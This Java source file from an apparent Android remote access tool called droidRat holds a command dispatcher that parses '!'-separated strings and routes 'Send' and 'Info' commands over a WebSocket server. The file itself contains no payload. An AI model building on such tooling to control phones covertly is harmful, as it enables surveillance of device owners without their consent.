package com.je_chen.droidRat.module.process.send.command.process_super;

import com.je_chen.droidRat.module.DroidRatWebSocketServer;
import com.je_chen.droidRat.module.process.send.command.process.InfoCommand;
import com.je_chen.droidRat.module.process.send.command.process.SendCommand;

public class CommandProcess {

    private final SendCommand sendCommand;
    private final InfoCommand infoCommand;

    public CommandProcess() {
        DroidRatWebSocketServer droidRatWebSocketServer = new DroidRatWebSocketServer();
        sendCommand = new SendCommand(droidRatWebSocketServer);
        infoCommand = new InfoCommand(droidRatWebSocketServer);
    }

    public void processCommand(String rawString) {
        try {
            System.out.println("Process Command : " + rawString);
            String[] rawStringArray = rawString.split("!");
            switch (rawStringArray[0]) {

                case "Send":
                    CommandFather commandFather = sendCommand;
                    commandFather.processCommand(rawStringArray[1]);
                    break;

                case "Info":
                    commandFather = infoCommand;
                    commandFather.processCommand(rawStringArray[1]);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
